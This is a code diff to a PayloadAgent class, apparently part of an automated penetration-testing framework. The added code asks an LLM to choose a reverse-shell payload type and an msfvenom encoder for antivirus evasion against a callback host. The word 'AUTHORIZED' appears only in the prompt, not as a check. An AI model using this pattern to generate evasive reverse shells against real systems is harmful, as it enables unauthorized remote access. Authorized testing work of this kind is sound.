@@ -99,6 +99,31 @@ class PayloadAgent(BaseAgent):
         self._session_id = session_id
         lhost = lhost or self._get_lhost()
 
+        # ── LLM payload strategy (visible reasoning) ──────────────────────
+        # The payload cluster now reasons with the .env LLM about payload_type
+        # + AV-evasion encoder instead of always using a fixed template.
+        try:
+            _spec = await self.think_json(
+                f"Building a reverse-shell payload for an AUTHORIZED {platform}/{arch} "
+                f"target (format={fmt}, callback {lhost}:{lport}). Recommend a "
+                "payload_type (staged|stageless|shell) and an msfvenom encoder for "
+                'basic AV evasion. Return {"payload_type":"...","encoder":"...",'
+                '"rationale":"one line"}.')
+            if isinstance(_spec, dict):
+                if _spec.get("payload_type") in ("staged", "stageless", "shell"):
+                    payload_type = _spec["payload_type"]
+                if _spec.get("encoder") and not encoder:
+                    encoder = _spec["encoder"]
+                if _spec.get("rationale"):
+                    await self.emit_reasoning(
+                        step="payload_strategy",
+                        reasoning=(f"LLM payload strategy: {payload_type} / encoder "
+                                   f"{encoder or 'none'} — {_spec.get('rationale')}"),
+                        decision="Apply LLM-chosen payload parameters",
+                        next_action="msfvenom generate")
+        except Exception:
+            pass
+
         # Resolve payload name
         payload_key = (platform, arch, payload_type)
         payload_name = custom_payload or self.PAYLOAD_MAP.get(
